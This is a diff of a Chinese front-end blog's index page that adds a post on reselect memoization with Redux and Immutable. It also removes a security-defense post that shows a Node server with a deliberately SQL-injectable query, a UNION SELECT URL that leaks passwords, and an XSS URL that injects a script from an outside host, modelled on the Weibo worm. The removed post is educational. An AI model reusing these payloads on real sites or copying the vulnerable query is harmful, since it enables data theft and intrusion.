@@ -313,6 +313,217 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/22/reselect初探/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="丰羡">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://otudpdtxd.bkt.clouddn.com/avator3@2x.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="丰羡的前端笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/02/22/reselect初探/" itemprop="url">reselect初探</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-22T18:57:14+08:00">
+                2018-02-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  813
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="一，redux还存在什么问题？"><a href="#一，redux还存在什么问题？" class="headerlink" title="一，redux还存在什么问题？"></a>一，redux还存在什么问题？</h1><p>redux的mapStateToPropsResult负责从state中处理数据，例如：<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">let mapStateToPropsResult = (<span class="keyword">state</span>)=&gt;(&#123;</div><div class="line">    count: getResult(<span class="keyword">state</span>.get('count'))</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
+<ul>
+<li>上面的意思是从state中取出count</li>
+<li>再将count传递给getResult方法返回一个结果</li>
+<li>再赋值给传递给子组件的count属性</li>
+</ul>
+<p>这上面的代码也没有问题，但此时props中只有一个字段count，如果再多几个呢？例如：</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">let mapStateToPropsResult = (<span class="keyword">state</span>)=&gt;(&#123;</div><div class="line">    count: getResult(<span class="keyword">state</span>.get('count')),</div><div class="line">    time:<span class="keyword">state</span>.get('time')</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
+<ul>
+<li>此时通过action修改time</li>
+<li>count没有修改</li>
+<li>但mapStateToPropsResult却重新执行了</li>
+<li>所以getResult也被动的再次执行了</li>
+</ul>
+<p>这就出现了问题，明明count没有改变，但getResult却又被执行了一次</p>
+<h1 id="二，换个简单的方式分析问题"><a href="#二，换个简单的方式分析问题" class="headerlink" title="二，换个简单的方式分析问题"></a>二，换个简单的方式分析问题</h1><p>上面的出现情况的问题，换个简单的代码来测试，例如：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">let getResult = <span class="function"><span class="params">(count)</span>=&gt;</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"测试一下"</span>)</div><div class="line">    <span class="keyword">return</span> count*<span class="number">3</span></div><div class="line">&#125;;</div><div class="line">setInterval(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">    let result = getResult(<span class="number">3</span>);</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;,<span class="number">3000</span>)</div></pre></td></tr></table></figure></p>
+<ul>
+<li>getResult是个用于计算的函数</li>
+<li>返回一个*3的数字</li>
+<li>现在每次调用，传入的值都是3</li>
+<li>结果每次都计算一遍，每次结果都是9</li>
+</ul>
+<p>这段代码本身并没有错，但count没有改变，但getResult却又被执行了一次</p>
+<h1 id="三，reselect登场"><a href="#三，reselect登场" class="headerlink" title="三，reselect登场"></a>三，reselect登场</h1><p>上面的问题想必已经明确了，reselect就是解决方案</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; createSelector &#125; <span class="keyword">from</span> <span class="string">'reselect'</span></div></pre></td></tr></table></figure>
+<ul>
+<li>reselect提供了一个createSelector方法，用于缓存数据</li>
+<li>createSelector接受两个参数</li>
+<li>参数1:用于从取值</li>
+<li>参数2:用于值计算</li>
+</ul>
+<p>这样不是很好理解，举个例子：</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> &#123; createSelector &#125; <span class="keyword">from</span> <span class="string">'reselect'</span></div><div class="line"><span class="keyword">import</span> &#123;Map&#125; <span class="keyword">from</span> <span class="string">'immutable'</span></div><div class="line">let getCount = <span class="function"><span class="params">(state)</span>=&gt;</span>state.get(<span class="string">'count'</span>);</div><div class="line">let getResult = createSelector([getCount],<span class="function"><span class="params">(count)</span>=&gt;</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"测试一下"</span>)</div><div class="line">    <span class="keyword">return</span> count*<span class="number">3</span></div><div class="line">&#125;);</div><div class="line">setInterval(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">    let result = getResult(Map(&#123;</div><div class="line">        count:<span class="number">3</span></div><div class="line">    &#125;));</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;,<span class="number">3000</span>)</div></pre></td></tr></table></figure>
+<p>上面代码执行的结果console.log(“测试一下”)这句话只执行了一次</p>
+<p>而result却每隔3000ms都能够拿到</p>
+<p>这就说明，第一次执行的结果被缓存了起来</p>
+<p>具体的执行过程应该是如下：</p>
+<ul>
+<li>getCount获取count的值为3</li>
+<li>3被传递给了createSelector的第二个参数，计算后得到结果9</li>
+<li>9被赋值给result</li>
+<li>同时9被缓存了起来</li>
+<li>3000毫秒之后</li>
+<li>createSelector判断传入的还是3，直接返回缓存的结果，而不再进行计算</li>
+</ul>
+<h1 id="四，结合redux和immutable的使用"><a href="#四，结合redux和immutable的使用" class="headerlink" title="四，结合redux和immutable的使用"></a>四，结合redux和immutable的使用</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></div><div class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></div><div class="line"><span class="keyword">import</span> &#123; createSelector &#125; <span class="keyword">from</span> <span class="string">'reselect'</span></div><div class="line"><span class="keyword">import</span> &#123;Immutable,<span class="built_in">Map</span>&#125; <span class="keyword">from</span> <span class="string">'immutable'</span></div><div class="line"><span class="keyword">let</span> getCount = <span class="function">(<span class="params">state</span>)=&gt;</span>state.get(<span class="string">'count'</span>);</div><div class="line"><span class="keyword">let</span> getResult = createSelector([getCount],(count)=&gt;&#123;</div><div class="line">    <span class="keyword">return</span> count*<span class="number">3</span></div><div class="line">&#125;);</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</div><div class="line">    render()&#123;</div><div class="line">        <span class="keyword">let</span> &#123;count&#125; = <span class="keyword">this</span>.props; </div><div class="line">        <span class="keyword">return</span>(</div><div class="line">            &lt;div&gt;&#123;count&#125;&lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        )</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp">let mapStateToPropsResult = (state)=&gt;(&#123;</span></div><div class="line"><span class="regexp">    count: getResult(state),</span></div><div class="line"><span class="regexp">    time:state.get('time')</span></div><div class="line"><span class="regexp">&#125;)</span></div><div class="line"><span class="regexp">export default connect(mapStateToPropsResult)(App);</span></div></pre></td></tr></table></figure>
+<p>通过上面的改造，当time修改的时候，count不再重复计算，而是取第一次缓存的数据，避免了性能的损耗</p>
+<h1 id="五，需要注意的点"><a href="#五，需要注意的点" class="headerlink" title="五，需要注意的点"></a>五，需要注意的点</h1><h2 id="获取多个值的写法"><a href="#获取多个值的写法" class="headerlink" title="获取多个值的写法"></a>获取多个值的写法</h2><p>createSelector获取多个值的写法为:<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">let handler = <span class="function"><span class="params">(valueone,valuetwo)</span>=&gt;</span>&#123;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">createSelector([getValueOneFn,getValueTwoFn],handler)</div></pre></td></tr></table></figure></p>
+<h2 id="明确value修改的概念"><a href="#明确value修改的概念" class="headerlink" title="明确value修改的概念"></a>明确value修改的概念</h2><p>createSelector会判断传入的value是否改修改</p>
+<p>value修改：handler会执行</p>
+<p>value不修改：handler不会执行</p>
+<p><strong>注意:createSelector严格遵守上面的规范</strong></p>
+<p>举个例子：</p>
+<ul>
+<li>第一次value为1，handler执行</li>
+<li>第二次value为2，与第一次的1不一样，handler执行</li>
+<li>第三次value为1，与第二次的2不一样，handler执行</li>
+</ul>
+<p>createSelector并不会缓存每次计算的结果，而只会缓存上次计算的结果</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/21/immutable和react以及redux的结合/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -548,7 +759,7 @@
 </ul>
 <p>修改mapStateToPropsResult：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></div><div class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</div><div class="line">    render()&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.props.count)</div><div class="line">        <span class="keyword">let</span> &#123;count&#125; = <span class="keyword">this</span>.props; </div><div class="line">        <span class="keyword">return</span>(</div><div class="line">            &lt;div&gt;&#123;count&#125;&lt;<span class="regexp">/div&gt;</span></div><div class="line"><span class="regexp">        )</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">&#125;</span></div><div class="line"><span class="regexp">let mapStateToPropsResult = (state)=&gt;(&#123;</span></div><div class="line"><span class="regexp">    count: state.get('count')</span></div><div class="line"><span class="regexp">&#125;)</span></div><div class="line"><span class="regexp">export default connect(mapStateToPropsResult)(App);</span></div></pre></td></tr></table></figure></p>
 <p>此时已经能够正常渲染了，但计数器的加减功能报错了</p>
-<h2 id="第三步，修改action"><a href="#第三步，修改action" class="headerlink" title="第三步，修改action"></a>第三步，修改action</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import Immutable <span class="keyword">from</span> 'immutable'</div><div class="line">const initialState = Immutable.Map(&#123;count:<span class="number">0</span>&#125;);</div><div class="line">export <span class="keyword">default</span>(<span class="keyword">state</span> = initialState,action)=&gt;&#123;</div><div class="line">    switch(action.type)&#123;</div><div class="line">        case 'ADD':</div><div class="line">            return <span class="keyword">state</span>.<span class="built_in">set</span>('count',<span class="keyword">state</span>.get('count')+action.data)</div><div class="line">        case 'SUB':</div><div class="line">            return <span class="keyword">state</span>.<span class="built_in">set</span>('count',<span class="keyword">state</span>.get('count')+action.data)</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            return <span class="keyword">state</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="第三步，修改action"><a href="#第三步，修改action" class="headerlink" title="第三步，修改action"></a>第三步，修改action</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import Immutable <span class="keyword">from</span> 'immutable'</div><div class="line">const initialState = Immutable.Map(&#123;count:<span class="number">0</span>&#125;);</div><div class="line">export <span class="keyword">default</span>(<span class="keyword">state</span> = initialState,action)=&gt;&#123;</div><div class="line">    switch(action.type)&#123;</div><div class="line">        case 'ADD':</div><div class="line">            return <span class="keyword">state</span>.merge(&#123;'count':<span class="keyword">state</span>.get('count')+action.data&#125;)</div><div class="line">        case 'SUB':</div><div class="line">            return <span class="keyword">state</span>.<span class="built_in">set</span>('count',<span class="keyword">state</span>.get('count')+action.data)</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            return <span class="keyword">state</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <ul>
 <li>使用immutable后，action变的十分简洁</li>
 <li>state的set方法等，直接返回一个新的state，十分舒爽</li>
@@ -2180,311 +2391,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/15/前端安全防御指南/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="丰羡">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://otudpdtxd.bkt.clouddn.com/avator3@2x.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="丰羡的前端笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/15/前端安全防御指南/" itemprop="url">前端安全防御指南</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-15T14:53:44+08:00">
-                2018-01-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计</span>
-                
-                <span title="字数统计">
-                  2,700
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  11
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="一，前端漏洞的介绍"><a href="#一，前端漏洞的介绍" class="headerlink" title="一，前端漏洞的介绍"></a>一，前端漏洞的介绍</h1><p>前端漏洞包括:</p>
-<pre><code>1，前端sql注入
-
-2，xss（cross site scripting）跨站脚本攻击
-
-3，csrf (Cross Site Request Forgery) 跨站请求伪造
-</code></pre><p>前端的攻击方式种类繁多，初次接触，不太容易理解这些词汇，所以我们从危害开始说起。</p>
-<hr>
-<h1 id="二，前端漏洞的危害"><a href="#二，前端漏洞的危害" class="headerlink" title="二，前端漏洞的危害"></a>二，前端漏洞的危害</h1><h2 id="1，新浪微博xss蠕虫攻击"><a href="#1，新浪微博xss蠕虫攻击" class="headerlink" title="1，新浪微博xss蠕虫攻击"></a>1，新浪微博xss蠕虫攻击</h2><p>2011年6月28日20:14分，新浪微博出现了一次比较大的xss蠕虫攻击事件，攻击行为如下：</p>
-<pre><code>1，微博名人堂的大V转发蠕虫
-
-2，蠕虫病毒迅速扩散，1小时时间感染了3w多用户
-
-3，被感染的用户会自动关注一名为hellosamy的用户，并继续转发xss蠕虫
-
-4，万幸新浪微博反应迅速，1小时后漏洞被修复，xss攻击没有大范围扩散
-</code></pre><h2 id="2，人人网xss攻击"><a href="#2，人人网xss攻击" class="headerlink" title="2，人人网xss攻击"></a>2，人人网xss攻击</h2><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fnhbzxyuvjj30mt0gh0wb.jpg" alt=""></p>
-<p>上图为人人网曝光出来的部分xss漏洞，由伟大的白帽子们发现，并将漏洞反馈给了人人网</p>
-<hr>
-<h1 id="三，前端攻击的发生"><a href="#三，前端攻击的发生" class="headerlink" title="三，前端攻击的发生"></a>三，前端攻击的发生</h1><h2 id="1，sql注入攻击的发生"><a href="#1，sql注入攻击的发生" class="headerlink" title="1，sql注入攻击的发生"></a>1，sql注入攻击的发生</h2><p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fnbiradqshj30df09a74z.jpg" alt=""></p>
-<p>例：现在有一个student表，表中有5个字段，表中有1条数据</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">name</span>,age <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</div></pre></td></tr></table></figure>
-<p>当前的查询语句如上图，其中id来自用户提交</p>
-<p>服务器（node版）代码如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">var</span> app = express();</div><div class="line"><span class="keyword">var</span> mysql = <span class="built_in">require</span>(<span class="string">'mysql'</span>);  <span class="comment">//调用MySQL模块</span></div><div class="line"><span class="keyword">var</span> connection = mysql.createConnection(&#123;</div><div class="line">    <span class="comment">//...连接数据库配置</span></div><div class="line">&#125;);</div><div class="line">connection.connect();</div><div class="line"></div><div class="line"><span class="comment">//创建路由</span></div><div class="line">app.get(<span class="string">'/:id'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> &#123; id &#125; = req.params;</div><div class="line">    <span class="keyword">let</span> result = <span class="keyword">await</span> getDataById(id);</div><div class="line">    res.send(result);</div><div class="line">&#125;);</div><div class="line"><span class="keyword">let</span> getDataById = <span class="function">(<span class="params">id</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</div><div class="line">        connection.query(<span class="string">`select name,age from student where id=<span class="subst">$&#123;id&#125;</span>;`</span>, (error, results, fields) =&gt; &#123;</div><div class="line">            <span class="keyword">if</span> (error) <span class="keyword">throw</span> error;</div><div class="line">            resolve(results);</div><div class="line">        &#125;);</div><div class="line">    &#125;)</div><div class="line">&#125;</div><div class="line"></div><div class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
-<p>此时启动服务，并进行访问：</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fnbj8qtijbj307n03t74g.jpg" alt=""></p>
-<p>可以看到url中localhost:3000/1的path<code>1</code>被当作参数传递给了sql语句，查询mysql之后，将查询到的结果返回给了client</p>
-<p>如果此时遭到恶意攻击，组装成如下链接：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/localhost:3000/</span><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">password</span>,1 <span class="title">from</span> <span class="title">student</span></span></div></pre></td></tr></table></figure></p>
-<p>服务端接受到参数后，组成了新的sql语句：</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> name,age from student where id=<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">password</span>,1 <span class="title">from</span> <span class="title">student</span>;</span></div></pre></td></tr></table></figure>
-<p>上面的意思是执行联合查询，此时启动服务，并进行访问：</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fnbpd06960j30h8072mxu.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fnbpjgnfgpj307i03i74c.jpg" alt=""></p>
-<p>可以看到student表的password已经泄漏了。</p>
-<hr>
-<h2 id="2，xss攻击的发生"><a href="#2，xss攻击的发生" class="headerlink" title="2，xss攻击的发生"></a>2，xss攻击的发生</h2><p>xss被称为跨站脚本攻击</p>
-<h3 id="2-1-同源策略"><a href="#2-1-同源策略" class="headerlink" title="2.1 同源策略"></a>2.1 同源策略</h3><p>xss的核心就是跨站两个字，为什么要跨站呢？因为浏览器存在同源策略</p>
-<p>同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源</p>
-<p><strong>简单来说就是客户端js不能够跨域(协议、端口、域名)请求资源</strong></p>
-<h3 id="2-2-xss跨站脚本攻击"><a href="#2-2-xss跨站脚本攻击" class="headerlink" title="2.2 xss跨站脚本攻击"></a>2.2 xss跨站脚本攻击</h3><p>恶意攻击者他们的目的是将自己的脚本注入到客户的浏览器中运行，同时攻击者想要做的肯定是一系列事情，所以不是几句代码就能解决，所以他们更希望的是能够把脚本代码文件，通过引入的形式加载进浏览器。</p>
-<p>这样做有两个好处：</p>
-<p>1，攻击者维护攻击代码方便，可读性强<br>2，能够绕过浏览器的输入限制。</p>
-<p>而这么做的后果，就是不可避免的要面对浏览器的同源策略，所以就要想办法绕过同源策略</p>
-<p>拿前面提到的微博xss蠕虫为例,在新浪名人堂中提交:</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>weibo.com<span class="regexp">/pub/</span>star<span class="regexp">/g/</span>xyyyd<span class="string">"&gt;?type=update</span></div></pre></td></tr></table></figure>
-<p>后端拿到链接后，会对字符串重组后返回给前端，用来展示</p>
-<p>重组后的链接为</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://weibo.<span class="keyword">com</span>/pub/<span class="keyword">star</span>.php?g=xyyyd<span class="comment">"&gt;?type=update</span></div></pre></td></tr></table></figure>
-<p>重组后的参数g，对应的是重组前path中g</p>
-<p>重组后g的值，对应的是path中xyyyd</p>
-<p><strong>注意：xss漏洞就出现在了这里，由于没有对xss进行过滤，攻击者可以修改参数xyyyd的值，构造恶意代码</strong></p>
-<p>攻击者构造了如下代码：</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/weibo.com/pub</span><span class="regexp">/star/g</span><span class="regexp">/xyyyd"&gt;&lt;script src=/</span><span class="regexp">/www.2kt.cn/images</span><span class="regexp">/t.js&gt;&lt;/script</span>&gt;?<span class="keyword">type</span>=update</div></pre></td></tr></table></figure>
-<pre><code>1，通过&gt;闭合了前一个html标签，这种攻击方式叫做猥琐绕过
-
-2，通过注入一个script标签的方式，请求第三方恶意脚本，由于是html标签发起的请求，所以不会被同源策略限制
-
-3，恶意脚本开始执行，通过脚本自动关注攻击者，并构造新的反射型xss代码，
-</code></pre><h2 id="3，csrf攻击的发生"><a href="#3，csrf攻击的发生" class="headerlink" title="3，csrf攻击的发生"></a>3，csrf攻击的发生</h2><p>csrf (Cross Site Request Forgery) 也叫跨站请求伪造</p>
-<h3 id="2-3-1，伪造"><a href="#2-3-1，伪造" class="headerlink" title="2.3.1，伪造"></a>2.3.1，伪造</h3><p>csrf攻击的核心就在伪造上，伪造一般是用来伪造用户的登陆状态，因为一般网站在执行关键操作的时候，都要求用户保持会话状态</p>
-<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fkfqjly7y8j31e80so41y.jpg" alt=""></p>
-<p>上图就是一个csrf攻击的模型。</p>
-<h3 id="2-3-2，csrf跨站请求伪造"><a href="#2-3-2，csrf跨站请求伪造" class="headerlink" title="2.3.2，csrf跨站请求伪造"></a>2.3.2，csrf跨站请求伪造</h3><p>首先是网站A的服务器：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">router.<span class="keyword">get</span>(<span class="string">'/'</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</div><div class="line">    let <span class="built_in">num</span> = ctx.session.<span class="built_in">num</span> || <span class="number">0</span></div><div class="line">    ctx.session.<span class="built_in">num</span> = ++<span class="built_in">num</span>;</div><div class="line">    console.log(<span class="string">"用户A访问次数："</span> + ctx.session.<span class="built_in">num</span>);</div><div class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>, &#123;&#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
-<p>通过上面的代码，能够知道：</p>
-<pre><code>网站A的/路由，处理函数中使用了session；
-
-用户A，第一次进入：
-
-    1，当用户第一次进入，session上的num字段是undefined
-    2，所以num的值为0，++0之后的值是1
-    3, 在控制台，输出同一用户的访问次数
-</code></pre><p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fkgew9u2raj30lw0aumy7.jpg" alt=""></p>
-<p>首先，访问网站A的服务器localhost:3000，然后查看控制台</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fkgf0r8nizj30e405imxq.jpg" alt=""></p>
-<p>可以看到控制台输出了num的值，这说明是第一次登陆。</p>
-<p>现在刷新页面10次。</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNc79ly1fkgf048f9ej30ew0e4wg3.jpg" alt=""></p>
-<p>可以看到：</p>
-<pre><code>1，同一用户一直维持着会话状态
-2，session中存储的num在不停增加
-</code></pre><p>上面是正常的流程，想要完成csrf攻击，需要借助网站B</p>
-<p>下面是网站B的服务器代码：</p>
